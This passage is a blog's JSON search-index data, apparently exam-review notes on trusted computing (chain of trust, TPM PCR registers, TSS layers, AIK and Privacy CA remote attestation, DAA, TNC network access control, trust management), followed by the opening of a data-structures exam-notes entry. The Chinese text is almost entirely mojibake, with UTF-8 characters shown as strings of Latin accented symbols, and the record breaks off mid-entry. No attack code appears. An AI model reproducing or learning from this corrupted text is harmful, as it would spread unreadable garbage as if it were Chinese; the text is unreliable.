å¯åŠ¨è¿‡ç¨‹ä¸­ï¼Œå¦‚æœ‰ä¿¡æ¯æ›´æ”¹ï¼Œéœ€è¦é‡æ–°è®¡ç®—åŸºå‡†å€¼ é™æ€çš„ç‰¹ç‚¹ï¼š å‘ç”Ÿåœ¨ç³»ç»Ÿå¼•å¯¼é˜¶æ®µï¼ŒBIOSã€æ“ä½œç³»ç»Ÿè£…è½½å™¨ã€æ“ä½œç³»ç»Ÿé¡ºåºæ¯”è¾ƒå›ºå®šï¼Œæ˜¯ä¸€ä¸ªå•ä¸€é“¾å¼è¿‡ç¨‹ã€‚ ç¬¬äºŒæ–¹é¢ï¼šåŠ¨æ€å¯ä¿¡åº¦é‡ï¼šå®Œæ•´æ€§è®¤è¯ï¼Œå®ç°å¯ä¿¡ä¼ é€’çš„è¿‡ç¨‹ã€‚ å®Œæ•´æ€§è®¤è¯è¿‡ç¨‹æ˜¯é€šè¿‡å¯¹å®ä½“è®¡ç®—ç»“æœå’Œç”Ÿæˆçš„å®Œæ•´æ€§åŸºå‡†å€¼ç›¸æ¯”è¾ƒã€‚ ä¿¡ä»»é“¾ä¿¡ä»»é“¾æœ‰åŠ¨æ€é™æ€ä¹‹åˆ†ï¼Œè¦åŒºåˆ†å®ƒä»¬ï¼Œå„è‡ªæŒ‡çš„æ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ é™æ€ï¼š ä»ç»ˆç«¯åŠ ç”µè‡³æ“ä½œç³»ç»Ÿè£…åœ¨çš„é™æ€å¯ä¿¡è®¤è¯ã€‚ ä¼˜ç‚¹ï¼šæ— æ³•æ”»å‡»ï¼Œæ— æ³•é€šè¿‡é‡ç½®ã€å›æº¯æ‰‹æ®µç¯¡æ”¹ä¿¡ä»»é“¾ ç¼ºç‚¹ï¼š ä¸€æ—¦å¹³å°è¿›å…¥ä¸å¯ä¿¡çŠ¶æ€ï¼Œå¹³å°ä»¥åçš„æ‰€æœ‰çŠ¶æ€éƒ½ä¸å¯ä¿¡ï¼Œå¹¶ä¸”æ— æ³•å›åˆ°å¯ä¿¡çŠ¶æ€ã€‚ åªèƒ½ä¿è¯åŠ è½½æ—¶è½¯ä»¶çš„å®Œæ•´æ€§,æ— æ³•ä¿è¯è¿è¡Œæ—¶çš„å®Œæ•´æ€§,æ— æ³•æŠµå¾¡è¿è¡Œæ—¶çš„æ”»å‡» è½¯ä»¶æ•°é‡å·¨å¤§å¹¶ä¸”å…·æœ‰ä¸åŒçš„ç‰ˆæœ¬,éœ€è¦å·¨å¤§çš„ç‰¹å¾æ•°æ®åº“æ”¯æŒã€‚ åŠ¨æ€ï¼š ä»æ“ä½œç³»ç»Ÿè‡³åº”ç”¨ç¨‹åºçš„åŠ¨æ€å¯ä¿¡è®¤è¯ã€‚ ä¼˜ç‚¹ï¼šç¨‹åºéš”ç¦»ã€‚å³ä½¿ç³»ç»Ÿä¸å¯ä¿¡ï¼Œæ•æ„Ÿä»£ç ä¹Ÿèƒ½å®‰å…¨æ‰§è¡Œ ç¼ºç‚¹ï¼šç¡¬ä»¶é™åˆ¶ åŠ¨æ€ä¿¡ä»»é“¾æ€ä¹ˆè¿ä½œçš„ï¼Ÿ â†’ åº”ç”¨ç¨‹åºè°ƒç”¨DRTMï¼ŒæŒ‡æ˜è¦ä¿æŠ¤çš„å†…å­˜åœ°å€ â†’ CPUç¦æ­¢DMAè®¿é—®è¯¥åœ°å€æ®µï¼Œç¦æ­¢ä¸­æ–­ã€debugå‘½ä»¤ â†’ å°†ç¨‹åºè½½å…¥CPUç¼“å­˜å¹¶é”å®šç¼“å­˜ â†’ è®¾ç½®PCRä¸º-1 â†’ å°†ç¼“å­˜ä¸­çš„ä»£ç å‘åˆ°TPMè¿›è¡Œåº¦é‡å¹¶æ‰©å±•å®Œæ•´æ€§åˆ°PCR17 PCRä¸€ä¸ªTPMé‡Œæœ‰å‡ ä¸ªPCRï¼ŒåŠŸèƒ½æ˜¯ä»€ä¹ˆï¼Ÿ PCRï¼šå¹³å°é…ç½®å¯„å­˜å™¨ï¼Œæ˜¯ç”¨æ¥è®°å½•ç³»ç»Ÿè¿è¡ŒçŠ¶æ€çš„å¯„å­˜å™¨ï¼Œæ˜¯TPMçš„æ ¸å¿ƒå™¨ä»¶ã€‚ TPM1.1 ç‰ˆ æœ‰16ä¸ªPCRã€‚ä¸åŒPCRä¿å­˜ä¸åŒæ¨¡å—çš„å®Œæ•´æ€§ã€‚ ä¼ é€’çš„è¿‡ç¨‹ï¼Œä¸åŒPCRè´Ÿè´£ä¸åŒæ­¥éª¤çš„hash PCR[0]:CRTM,BIOSå’Œå¹³å°æ‰©å±• PCR[1]:å¹³å°é…ç½® PCR[2]:ROM ä»£ç (å¯é€‰) PCR[3]:ROM é…ç½®å’Œæ•°æ®(å¯é€‰) PCR[4]:åˆå§‹åŒ–è£…è½½ä»£ç (é€šå¸¸ä¸ºä¸»å¼•å¯¼åŒº) PCR[5]:åˆå§‹åŒ–è£…è½½ä»£ç é…ç½®å’Œæ•°æ® PCR[6]:çŠ¶æ€è½¬æ¢ PCR[7]:ä¿ç•™ ä¿¡ä»»é“¾çš„åº”ç”¨ï¼Ÿ åŸºäºé™æ€å¯ä¿¡æ ¹çš„ä¿¡ä»»é“¾åº”ç”¨ç³»ç»Ÿ åŸºäºåŠ¨æ€å¯ä¿¡æ ¹çš„ä¿¡ä»»é“¾åº”ç”¨ç³»ç»Ÿ ä¿¡ä»»é“¾è¿œç¨‹è¯æ˜æŠ€æœ¯ äº‘è®¡ç®—ç¯å¢ƒä¸‹çš„ä¿¡ä»»é“¾åº”ç”¨ç³»ç»Ÿ å…·ä½“è¿‡ç¨‹ å¯åŠ¨è®¡ç®—æœº,å¼€å§‹è¿è¡Œ CRTM; CRTM å¼€å§‹åº¦é‡ BIOSçš„å®Œæ•´æ€§,å¹¶ä¿å­˜å…¶åº¦é‡åŸºå‡†å€¼,éšåæŠŠæ§åˆ¶æƒäº¤ç»™ BIOS; BIOSéšå³åˆå§‹åŒ–,å¹¶å¼€å§‹åº¦é‡ä¸»å¼•å¯¼åŒºçš„å®Œæ•´æ€§,ä¿å­˜åº¦é‡åŸºå‡†å€¼,è£…å…¥ä¸»å¼•å¯¼åŒº,éšåæŠŠæ§åˆ¶æƒäº¤ç»™ä¸»å¼•å¯¼åŒº; ä¸»å¼•å¯¼åŒºåº¦é‡ OSåŠ è½½å™¨çš„å®Œæ•´æ€§,ä¿å­˜åº¦é‡åŸºå‡†å€¼,è£…å…¥ OSåŠ è½½å™¨,éšå³æŠŠæ§åˆ¶æƒäº¤ç»™OSåŠ è½½å™¨; OSLoaderåº¦é‡ OSçš„å®Œæ•´æ€§,ä¿å­˜åº¦é‡åŸºå‡†å€¼,è£…å…¥ OS,éšå³æŠŠæ§åˆ¶æƒäº¤ç»™ OS; OSåº¦é‡ Applicationçš„å®Œæ•´æ€§,ä¿å­˜åº¦é‡åŸºå‡†å€¼,è£…å…¥ Application,éšå³æŠŠæ§åˆ¶æƒäº¤ç»™Application; åº”ç”¨è½¯ä»¶ Applicationè¿è¡Œã€‚ ä¼šç”»ï¼Œä¼šè§£é‡Šï¼Œæ–‡å­—è¦è®°ä½ï¼Œæ­¥éª¤ä¹Ÿè¦æ˜ç¡®ï¼Œæè¿°ç”¨è¯­å‡†ç¡®ã€‚ ç¬¬å››ç« å¯ä¿¡è½¯ä»¶æ ˆï¼Œç±»ä¼¼å°å‹çš„æ“ä½œç³»ç»Ÿ TSSä½“ç³»ç»“æ„ï¼Ÿ TPM â†’ è®¾å¤‡é©±åŠ¨ç¨‹åº â†’ è®¾å¤‡é©±åŠ¨ç¨‹åºæ¥å£ â†’ æ ¸å¿ƒæœåŠ¡ â†’ æ ¸å¿ƒæœåŠ¡çš„æ¥å£ TPM2.hä½äºä½“ç³»ç»“æ„çš„å“ªä¸€å±‚ï¼Ÿ TSPIçš„ä¸Šå±‚ï¼Œç¨‹åºè°ƒç”¨çš„æ˜¯TSPIã€‚ TSSæ˜¯å¯ä¿¡è½¯ä»¶æ ˆï¼Œä¸åŒ…æ‹¬TPMï¼Œå› ä¸ºå®ƒæ˜¯ç¡¬ä»¶ TSSåˆ†æˆä¸¤ç§æ¨¡å¼ å†…æ ¸æ¨¡å¼ï¼šæ“ä½œç³»ç»Ÿçš„è®¾å¤‡é©±åŠ¨ç¨‹åºå’Œæ ¸å¿ƒç»„ä»¶é©»ç•™çš„åœ°æ–¹ã€‚ ï¼ˆè¯¥åŒºåŸŸä¸‹çš„ä»£ç ç”¨äºç»´æŠ¤åŠä¿æŠ¤ç”¨æˆ·æ¨¡å¼ä¸‹è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚ï¼‰ ç”¨æˆ·æ¨¡å¼ï¼šç”¨æˆ·åº”ç”¨ç¨‹åºå’ŒæœåŠ¡æ‰§è¡Œçš„åœ°æ–¹ã€‚ è¿œç¨‹è¯æ˜ï¼ˆP62ï¼‰ å¤§æ¦‚çœ‹ä¸‹ä¸¤ä¸ªåè®®ï¼Œprivacy CAã€DAA æŒ‘æˆ˜åº”ç­” ç¬¬äº”ç« ï¼ˆäº†è§£ä¸€ä¸‹ï¼‰å¯ä¿¡è®¡ç®—å¹³å°ï¼Ÿ è½¯ç¡¬ä»¶ç»“åˆçš„å®ä½“ å¯ä¿¡è®¡ç®—å¹³å°çš„ä½“ç³»æ¶æ„ï¼Ÿ åŸºç¡€ç¡¬ä»¶å±‚ã€å¯ä¿¡æœåŠ¡å±‚ã€å®‰å…¨åº”ç”¨å±‚ å¯ä¿¡æœºåˆ¶ï¼Ÿï¼ˆP73ï¼‰ å¯ä¿¡åº¦é‡æœºåˆ¶ï¼šå¹³å°å®Œæ•´æ€§åº¦é‡æœºåˆ¶ï¼Œè´Ÿè´£åº¦é‡å¹³å°çŠ¶æ€çš„å®Œæ•´æ€§ä¿¡æ¯ï¼Œå¹¶æŒ‰ç…§ç‰¹å®šçš„æ–¹æ³•å’Œæ­¥éª¤è¿›è¡Œå¯¹æ¯”å’ŒæŠ¥å‘Šã€‚ å¯ä¿¡å­˜å‚¨æœºåˆ¶ï¼šå¯ä¿¡å­˜å‚¨æœºåˆ¶è´Ÿè´£ä¿è¯åŸºå‡†ä¿¡æ¯ã€åº¦é‡ä¿¡æ¯ä»¥åŠæ‘˜è¦ä¿¡æ¯ã€æ ¸å¿ƒæ•°æ®çš„å¯ä¿¡å­˜å‚¨ä¸è®¿é—®ã€‚ å…¶ä¸»è¦æ€æƒ³å°±æ˜¯é€šè¿‡å¯†é’¥è¿›è¡Œæ•°æ®ä¿æŠ¤ã€‚ å¯ä¿¡æŠ¥å‘Šæœºåˆ¶ï¼šæä¾›è¯æ®è¯æ˜è¿œç¨‹ç”¨æˆ·èº«ä»½å’Œå¹³å°å¯ä¿¡æ€§ å¯ä¿¡è®¤è¯æœºåˆ¶ï¼šæä¾›è¯æ®è¯æ˜è¿œç¨‹ç”¨æˆ·èº«ä»½å’Œå¹³å°å¯ä¿¡æ€§ å¯ä¿¡å¹³å°çš„åº”ç”¨ï¼Ÿ è™šæ‹Ÿå¯ä¿¡è®¡ç®—å¹³å° ç§»åŠ¨å¯ä¿¡è®¡ç®—å¹³å° ç¬¬å…­ç« ï¼ˆç¨å¾®äº†è§£ä¸€ä¸‹ï¼‰ç¬¬ä¸ƒç« ï¼ˆé‡ç‚¹ï¼‰å®Œæ•´æ€§åº¦é‡ æ˜¯TPM&#x2F;TCMå®‰å…¨èŠ¯ç‰‡è·å–å¹³å°è½¯ç¡¬ä»¶å¯ä¿¡åº¦ç‰¹å¾å€¼çš„è¿‡ç¨‹ï¼Œé€šå¸¸è¿™äº›å€¼ä»¥æ‘˜è¦çš„å½¢å¼æ‰©å±•å­˜å‚¨åˆ°å®‰å…¨èŠ¯ç‰‡çš„ PCR ä¸­ å¹³å°èº«ä»½å¯†é’¥å¼•è¯ AIKä¸“é—¨ç”¨äºè¿œç¨‹è¯æ˜ï¼ŒTPM è¿œç¨‹è¯æ˜çš„ç­¾åè¿‡ç¨‹ä¹Ÿè¢«ç§°ä¸ºå¹³å°èº«ä»½å¯†é’¥å¼•è¯ åè®®æ¨¡å‹ è¯æ˜è¿‡ç¨‹ï¼Œåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼šå®Œæ•´æ€§åº¦é‡ï¼Œå®Œæ•´æ€§æŠ¥å‘Šï¼Œå®Œæ•´æ€§è¯æ˜ è¿œç¨‹è¯æ˜ä½¿ç”¨çš„æ˜¯æŒ‘æˆ˜åº”ç­”åè®®ã€‚ åŸºäºAIKçš„è¿œç¨‹è¯æ˜æ¨¡å‹ AIKè¿œç¨‹è¯æ˜çš„æµç¨‹è§£é‡Šï¼ˆå¯¹ä¸‹å›¾çš„è§£é‡Šï¼‰ Privacy CA ä¸‹å›¾ä¼šç”»ï¼Œä¼šè§£é‡Š&#x2F;ä¸»è¦æ­¥éª¤çš„æ–‡å­—æè¿° å¹³å°èº«ä»½è¯ä¹¦é¢å‘ å¹³å°èº«ä»½è®¤è¯ èº«ä»½è¯ä¹¦é¢å‘ TPMç”ŸæˆRSAç­¾åå¯†é’¥AIKï¼Œç„¶åå°†EKè¯ä¹¦ã€å¹³å°è¯ä¹¦ã€ä¸€è‡´æ€§è¯ä¹¦ã€AIKå…¬é’¥æ‰“åŒ…ã€‚ å°†è¿™äº›æ•°æ®ä½œä¸ºAIKè¯ä¹¦ç”³è¯·è¯·æ±‚å‘é€ç»™å¯ä¿¡ç¬¬ä¸‰æ–¹ å¯ä¿¡ç¬¬ä¸‰æ–¹privacy CAé€šè¿‡å¯¹EKè¯ä¹¦ã€å¹³å°ä¸€è‡´æ€§è¯ä¹¦ç­‰ï¼ŒéªŒè¯è¯·æ±‚æ˜¯å¦æœ‰æ•ˆ ä½¿ç”¨ç­¾åå¯†é’¥å¯¹AIKè¯ä¹¦è¿›è¡Œç­¾åï¼Œå¹¶ç”¨Ekçš„å…¬é’¥è¿›è¡ŒåŠ å¯† å°†AIKè¯ä¹¦åº”ç­”æ•°æ®æŠ¥è¿”å›ç»™TPMï¼Œå¹¶é€šè¿‡æ¥å£å‘½ä»¤æ¥è§£å¯†è·å¾—AIKè¯ä¹¦ å¹³å°èº«ä»½è®¤è¯ å¹³å°Aå‘å¹³å°Bå‘é€è¯æ˜è¯·æ±‚ å¹³å°Bå‘Aå‘å‡ºæŒ‘æˆ˜éšæœºæ•°ï¼ŒåŒæ—¶æŒ‡æ˜éœ€è¦è¯æ˜PCR å¹³å°AåŠ è½½AIKå¯†é’¥ï¼Œä½¿ç”¨ç§é’¥å¯¹PCRç­¾å Aå°†è¿œç¨‹è¯æ˜ç­¾åå’Œå¹³å°é…ç½®å®Œæ•´æ€§æ—¥å¿—å‘ç»™B Bè¯·æ±‚privacy CAï¼ŒæŸ¥è¯¢å¹³å°Açš„TPMèº«ä»½æ˜¯å¦å¯ä¿¡ Açš„TPMèº«ä»½å¯ä¿¡ï¼Œåˆ™BéªŒè¯Açš„ç­¾ååŠå¹³å°é…ç½®å®Œæ•´æ€§æœ‰æ•ˆ DAAå’Œprivacy CAæ¯”è¾ƒï¼Œä¼˜ç¼ºç‚¹ã€‚DAAæ€ä¹ˆè¿ä½œçš„ï¼Ÿæœ‰äº†privacy CAä¸ºä»€ä¹ˆè¿˜è¦DAAï¼Ÿ Privacy CA : å¯ä¿¡ç¬¬ä¸‰æ–¹åŸºæœ¬è¿œç¨‹è¯æ˜åè®®ï¼Œè´Ÿè´£é¢å‘å¯ä¿¡è®¡ç®—å¹³å°çš„èº«ä»½å¯†é’¥è¯ä¹¦ï¼Œå¹¶æä¾›æœ‰æ•ˆæ€§çš„éªŒè¯ã€‚ DAAï¼šåŒ¿åè¯æ˜TPMèº«ä»½ï¼ŒTPMä¸éœ€è¦å¯ä¿¡ç¬¬ä¸‰æ–¹å¸®åŠ©çš„æƒ…å†µä¸‹ï¼Œç›´æ¥å‘è¿œç¨‹éªŒè¯è€…è®¤è¯å¯ä¿¡è®¡ç®—å¹³å°çš„çœŸå®æ€§å’Œå¯ä¿¡æ€§ã€‚ å› ä¸ºprivacy CAå¯ä¿¡ç¬¬ä¸‰æ–¹å®Œå…¨çŸ¥é“TPMçš„çœŸå®èº«ä»½ï¼Œå¦‚æœéªŒè¯æ–¹å’Œå¯ä¿¡ç¬¬ä¸‰æ–¹ä¸²è°‹ï¼ŒTPMèº«ä»½éšç§æ²¡æœ‰ä¿è¯ã€‚å¦å¤–æ¯æ¬¡è®¤è¯æ—¶ï¼ŒéªŒè¯æ–¹éƒ½éœ€è¦æŸ¥è¯¢å¯ä¿¡ç¬¬ä¸‰æ–¹ã€‚ DAAè¿œç¨‹è¿ä½œçš„æµç¨‹ï¼Ÿ æè¿°æµç¨‹å’Œæ­¥éª¤ï¼Œä¼šç”»å›¾ TPMé€šè¿‡å¯†é’¥ç”Ÿæˆå™¨äº§ç”Ÿä¸€å¯¹RSAå¯†é’¥ï¼Œé€šè¿‡EKå‘DAAå‘å¸ƒè€…æä¾›èº«ä»½åˆæ³•æ€§ å‡­è¯é¢å‘è€…é€šè¿‡EKï¼Œç»™TPMä¸€ä¸ªéªŒè¯è¯ä¹¦ TPMç”Ÿæˆä¸€ä¸ªAIKï¼Œå¹¶ç”¨ä»Issuerè·å¾—çš„è¯ä¹¦ç­¾åå‘ç»™éªŒè¯æ–¹ï¼ŒéªŒè¯æ–¹å—åˆ°attestorå‘æ¥çš„ä¿¡æ¯åï¼Œå°†attestoræä¾›çš„ç­¾åå’Œå…¬é’¥è¿›è¡Œå¯ä¿¡éªŒè¯ å¹³å°çš„å®Œæ•´æ€§è¯æ˜ï¼ˆäº†è§£æ¦‚å¿µï¼‰ åŸºäºäºŒè¿›åˆ¶çš„è¿œç¨‹è¯æ˜ TPM&#x2F;TCM å®‰å…¨èŠ¯ç‰‡ç›´æ¥è¯æ˜ç”¨äºŒè¿›åˆ¶ Hashå€¼è¡¨ç¤ºçš„å¹³å°å®Œæ•´æ€§å€¼ åŸºäºå±æ€§çš„è¿œç¨‹è¯æ˜ åŸº äº å± æ€§ çš„ è¿œ ç¨‹ è¯ æ˜ (PB A ,Property - based At testation )æ˜¯ ä¸€ ç§ åœ¨ ä» å¹³ å° çš„ é… ç½® å¯ ä»¥ è½¬ æ¢å¾—åˆ°å¹³å°å±æ€§çš„åŸºç¡€ä¸Š,ç”±å¯ä¿¡ç¬¬ä¸‰æ–¹æä¾›å±æ€§è¯ä¹¦,æ¥è¯æ˜è¢«è¯æ˜æ–¹çš„ç»„ä»¶æ»¡è¶³æŸä¸ªæˆ–æŸ äº›å±æ€§çš„è¿œç¨‹è¯æ˜æœºåˆ¶ è¿œç¨‹è¯æ˜çš„åº”ç”¨ æ•°å­—ç‰ˆæƒç®¡ç†DRMã€ç§»åŠ¨æ‰‹æœºå¹³å°ã€å¯ä¿¡ä¿¡é“æ„å»ºã€å¯ä¿¡ç½‘ç»œæ¥å…¥ã€äº‘è®¡ç®—èŠ‚ç‚¹éªŒè¯ ç¬¬å…«ç« ï¼ˆæ¯”è¾ƒé‡è¦ï¼‰NACæŠ€æœ¯æ¡†æ¶ï¼Ÿ C-NACæŠ€æœ¯ï¼Ÿ ç°æœ‰æŠ€æœ¯çš„ç¼ºé™·ï¼Ÿ äº’æ“ä½œå’Œå¯æ‰©å±•æ€§å·® å®¹æ˜“å—åˆ°ä¼ªé€ çŠ¶æ€è¡Œä¸ºçš„æ”»å‡» ç¼ºä¹æ¥å…¥åæ§åˆ¶ TNCçš„æ¶æ„ï¼Ÿ ä¼šç”»ï¼Œä¼šæè¿°ã€‚æè¿°å¥½æ€»çš„æ¶æ„çŸ¥è¯†ï¼Œä¸éœ€è¦ç‰¹åˆ«ç»†è‡´ TNCçš„å·¥ä½œæµç¨‹ï¼ˆ8.2.3ï¼‰ çœ‹æ˜ç™½å°±å¥½ åœ¨å¼€å§‹æ¥å…¥ç½‘ç»œä¹‹å‰,TNCCä½¿ç”¨å¹³å°ä¸“ç”¨çš„ç»‘å®šå·¥å…·è½½å…¥å¹³å°ç›¸å…³çš„IMC,å¹¶ä¸”å¯¹IMCæ‰§è¡Œåˆå§‹åŒ–æ“ä½œã€‚ä¸æ­¤ç±»ä¼¼,TNCSåˆ™è½½å…¥ç›¸å…³çš„IMV å¹¶åˆå§‹åŒ–ã€‚ å½“ä¸€ä¸ªç½‘ç»œè¿æ¥å°è¯•å¼€å§‹è§¦å‘,ARä¸Šçš„ NARå°±ä¼šå‘ PEPå‘é€è¿æ¥è¯·æ±‚ã€‚ æ”¶åˆ°æ¥è‡ª NARçš„è¿æ¥è¯·æ±‚å,NARä¼šå‘é€ä¸€ä¸ªç½‘ç»œè®¿é—®å†³ç­–è¯·æ±‚åˆ° NAAã€‚ NAA ä¸€èˆ¬ä¸ºç½‘ç»œæ¥å…¥3A è®¤è¯æœåŠ¡å™¨,å¦‚RADIUSå’ŒDiameterã€‚åœ¨æœåŠ¡å™¨å®Œæˆç”¨æˆ·èº«ä»½è®¤è¯å,NAAé€šçŸ¥ TNCSæœ‰æ–°çš„è¿æ¥è¯·æ±‚ã€‚ TNCSå’Œ TNCCä¹‹é—´è¿›è¡Œå¹³å°è¯ä¹¦çš„é‰´åˆ«ã€‚ å¹³å°èº«ä»½éªŒè¯æˆåŠŸä¹‹å,TNCSé€šçŸ¥IMV æœ‰æ–°çš„è¿æ¥è¯·æ±‚,TNCCé€šçŸ¥IMCæœ‰æ–°çš„è¿æ¥è¯·æ±‚,IMCå‘TNCCå‘é€ä¸€å®šæ•°é‡çš„IMC-IMV æ¶ˆæ¯ã€‚ PDPå¯¹ ARçš„å®Œæ•´æ€§è¿›è¡ŒéªŒè¯,æœ‰3ä¸ªå­æ­¥éª¤: ä¸ºäº†å®Œæˆä¸€æ¬¡å®Œæ•´æ€§æ£€æŸ¥æ¡æ‰‹,TNCCå’Œ TNCSäº¤æ¢å®Œæ•´æ€§éªŒè¯çš„ç›¸å…³ä¿¡æ¯,è¿™äº›ä¿¡æ¯åœ¨NARã€PEP å’Œ NAA ä¹‹é—´è½¬å‘,ç›´åˆ° TNCS è®¤ä¸º TNCC å‘é€ çš„ å®Œ æ•´ æ€§ éªŒ è¯ ä¿¡ æ¯ æ»¡ è¶³éœ€æ±‚ã€‚ TNCSå°†æ¯ä¸ªIMCæ”¶é›†çš„å®Œæ•´æ€§ä¿¡æ¯å‘é€ç»™å¯¹åº”çš„IMV,IMV ä¼šå¯¹IMCæ¶ˆæ¯è¿›è¡Œåˆ†æ,å¦‚æœIMVéœ€è¦æ›´å¤šçš„ä¿¡æ¯,é‚£ä¹ˆå®ƒä¼šé€šè¿‡IF-IMVå‘ TNCSå‘é€å®Œæ•´æ€§è¯·æ±‚æ¶ˆæ¯;å¦‚æœIMV å®Œæˆäº†éªŒè¯,åˆ™é€šè¿‡IF-IMV æ¥å£å‘é€ç»“æœåˆ° TNCSã€‚ TNCCé€šè¿‡IF-IMCæŠŠæ¥è‡ª TNCSçš„æ¶ˆæ¯ä¼ é€’ç»™ç›¸åº”çš„IMC,å¹¶ä¸”æŠŠæ¥è‡ªIMCçš„ æ¶ˆæ¯å‘é€ç»™TNCSã€‚ TNCSå®Œæˆå’Œ TNCCçš„å®Œæ•´æ€§æ¡æ‰‹ä¹‹å,TNCSå°†ç½‘ç»œæ¥å…¥å†³ç­–å‘é€ç»™ NAAã€‚ NAA å°†ç½‘ç»œæ¥å…¥å†³ç­–å‘é€ç»™ PEP,PEPæ ¹æ®æ¥å…¥å†³ç­–å®æ–½ç½‘ç»œè®¿é—®æ§åˆ¶,å¹¶å°†æœ€åçš„æ¥å…¥ç»“æœè¿”å›ç»™ ARã€‚å¦‚æœ ARæ²¡æœ‰æ»¡è¶³å®Œæ•´æ€§éªŒè¯,TNCSå¯ä»¥å°†è¿™ä¸ª ARéš”ç¦»åˆ°ä¿®å¤ç½‘ç»œ,åœ¨ä¿®å¤ç½‘ç»œä¸­é€šè¿‡å®Œæ•´æ€§ä¿®å¤åå¯ä»¥é‡æ–°å‘èµ·è¿æ¥è¯·æ±‚ã€‚ ç¬¬ä¹ç« ä¿¡ä»»çš„å®šä¹‰ï¼Ÿåˆ†ç±»ï¼Ÿ å®šä¹‰ï¼šä»»è¡¨å¾å¯¹å®ä½“èº«ä»½çš„ç¡®è®¤å’Œå¯¹å…¶æœ¬èº«è¡Œä¸ºçš„æœŸæœ›,ä¸€æ–¹é¢æ˜¯å¯¹å®ä½“çš„å†å²è¡Œä¸ºçš„ç›´ æ¥è®¤çŸ¥,å¦ä¸€æ–¹é¢æ˜¯å…¶ä»–å®ä½“å¯¹è¯¥å®ä½“çš„æ¨èã€‚ä¿¡ä»»å¯ä»¥éšå®ä½“è¡Œä¸ºåŠ¨æ€å˜åŒ–ä¸”éšæ—¶é—´å»¶ç»­è€Œè¡° å‡ã€‚ä¿¡ä»»å¼ºè°ƒå¯é¢„æµ‹æ€§ã€‚ åˆ†ç±»ï¼šèº«ä»½ä¿¡ä»»ã€è¡Œä¸ºä¿¡ä»» å¸¸è§çš„èº«ä»½ä¿¡ä»»æœ‰ä»€ä¹ˆæ–¹æ³•ï¼Ÿï¼ˆP136ï¼‰ è®¤è¯ã€æˆæƒã€åŠ å¯†ã€æ•°æ®éšè—ã€æ•°å­—ç­¾åã€å…¬é’¥è¯ä¹¦ã€è®¿é—®æ§åˆ¶ æœ‰äº†èº«ä»½ä¿¡ä»»ï¼Œä¸ºä»€ä¹ˆè¿˜è¦è¡Œä¸ºä¿¡ä»»ï¼Ÿ å¤§é‡çš„è®¡ç®—èµ„æºçš„ä»‹å…¥å°†å¯¼è‡´æ— æ³•ç›´æ¥åœ¨å„ä¸ªå®ä½“é—´å»ºç«‹äº‹å…ˆçš„ä¿¡ä»»å…³ç³» åŸå…ˆä¿¡èµ–çš„ç”¨æˆ·æˆ–èµ„æºä¹Ÿå¯èƒ½å˜å¾—ä¸å¯ä¿¡ ä¿¡ä»»å…³ç³»çš„åˆ’åˆ†ï¼Ÿ å¤šç§åˆ’åˆ†æ–¹å¼ã€‚ èº«ä»½ä¿¡ä»»è¡Œä¸ºä¿¡ä»»ã€‚ åŸŸå†…ä¿¡ä»»ã€åŸŸé—´ä¿¡ä»»ã€‚ ç›´æ¥ä¿¡ä»»ã€åé¦ˆä¿¡ä»»ã€‚ å¯ä¿¡ç®¡ç†ï¼ˆP142ï¼Œ9.2.1ï¼‰ æ¦‚å¿µï¼Œäº†è§£å®šä¹‰ ä¿¡ä»»ç®¡ç†çš„å®šä¹‰ï¼šé‡‡ç”¨ä¸€ç§ç»Ÿä¸€çš„æ–¹æ³•æè¿°å’Œè§£é‡Šå®‰å…¨ç­–ç•¥ã€å®‰å…¨å‡­è¯ä»¥åŠç”¨äºç›´æ¥æˆæƒå…³é”®æ€§å®‰å…¨æ“ä½œçš„ä¿¡ä»»å…³ç³»ã€‚ ä¸»è¦ç ”ç©¶å†…å®¹ï¼Ÿ åˆ¶å®šå®‰å…¨ç­–ç•¥ã€è·å–å®‰å…¨å‡­è¯ã€åˆ¤æ–­å®‰å…¨å‡­è¯æ˜¯å¦æ»¡è¶³ç›¸å…³çš„å®‰å…¨ç­–ç•¥ã€‚","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"å¯ä¿¡è®¡ç®—","slug":"æœŸæœ«è€ƒè¯•/å¯ä¿¡è®¡ç®—","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"æ•°æ®ç»“æ„æœŸæœ«è€ƒç‚¹","slug":"æ•°æ®ç»“æ„æœŸæœ«è€ƒç‚¹","date":"2021-01-21T15:09:18.000Z","updated":"2024-11-12T07:00:04.000Z","comments":true,"path":"2021/01/21/æ•°æ®ç»“æ„æœŸæœ«è€ƒç‚¹/","permalink":"https://gryffinbit.top/2021/01/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"æ•°æ®ç»“æ„æœŸæœ«è€ƒç‚¹ æœ¬æ–‡ç« notionç‰ˆæœ¬é“¾æ¥ï¼ˆæ ¼å¼æ›´å¥½çœ‹ä¸€äº›ï¼‰ï¼šhttps://www.notion.so/gryffinbitworkspace/5dbf3d58c5404a99bcaaba96cc42f58a æœ¬æ–‡ç« PDFç‰ˆæœ¬é“¾æ¥ï¼šhttps://gryffinbit.lanzous.com/i4duqknlove æ•°æ®ç»“æ„æœŸæœ«è€ƒè¯•è€ƒç‚¹ï¼Œç›¸å…³çš„é™„ä»¶ï¼šhttps://gryffinbit.lanzous.com/iTWTpknltyh çº¿æ€§è¡¨çº¿æ€§è¡¨åŠé“¾è¡¨çš„æ·»åŠ ã€æ’å…¥ã€åˆ é™¤ï¼ˆé‡ç‚¹æ˜¯æŒ‡é’ˆçš„ä½ç½®å˜åŒ–é—®é¢˜ï¼‰ é¢˜ $Loc_{ai}&#x3D;Loc_{a1}+(i-1)*l$ é˜Ÿåˆ—ä¸æ ˆé˜Ÿåˆ—ä¸æ ˆçš„æ¦‚å¿µåŠåŸºæœ¬æ“ä½œï¼ˆè€ƒé€‰æ‹©é¢˜ï¼‰ åŸºæœ¬æ¦‚å¿µ æ 